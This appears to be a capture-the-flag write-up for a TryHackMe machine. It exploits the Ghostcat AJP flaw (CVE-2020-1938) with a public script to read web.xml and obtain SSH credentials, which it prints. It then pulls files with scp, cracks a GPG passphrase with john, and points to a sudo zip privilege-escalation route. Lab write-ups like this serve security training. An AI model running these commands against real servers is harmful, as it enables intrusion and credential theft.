8009/tcp  open     ajp13 : This seems to be an interesting find.

Apache JServ Protocol (AJP) is used for communication between Tomcat and Apache web server. This protocol is binary and is enabled by default. Anytime the web server is started, AJP protocol is started on port 8009. It is primarily used as a reverse proxy to communicate with application servers.

The Chinese cyber security company Chaitin Tech discovered the vulnerability, named “Ghostcat”, which is tracked using CVE-2020-1938 and rated critical severity with a CVSS v3 score of 9.8.

Exploitability.

With this vulnerability, an attacker can easily gain access to configuration files if the protocol is publicly available. If arbitrary file upload is not disabled, it is then possible for the attacker to upload malicious code to the web server that enables remote code execution.

Methodology.

So a little google search on an appropriate exploit lands us on Github: https://github.com/00theway/Ghostcat-CNVD-2020-10487.git

Run the command:
>python3 ajpShooter.py http://<victim IP>:8080/ 8009 /WEB-INF/web.xml read

> This gives us a username and passwd: skyfuck:8730281lkjlkjdqlksalks
>ssh into the machine using the credentials obtaine.

>Two files on the home dir: credential.pgp and tryhackme.asc

> we'll just grab both files to our local system
scp username@<victim IP>:/home/username/* .

>Now use gpg2john to convert the tryhackme.asc file.
sudo gpg2john tryhackme.asc > hashes

>john --wordlist=/opt/rockyou.txt hashes

gpg --import tryhackme.asc [use the passwd cracked from john]

gpg --decrypt credential.pgp

>we find a user name annd a passwd.


PRIVESC.

sudo -l

>privesc vector is through the /usr/bin/zip

>GTFObins, look for zip privesc vector
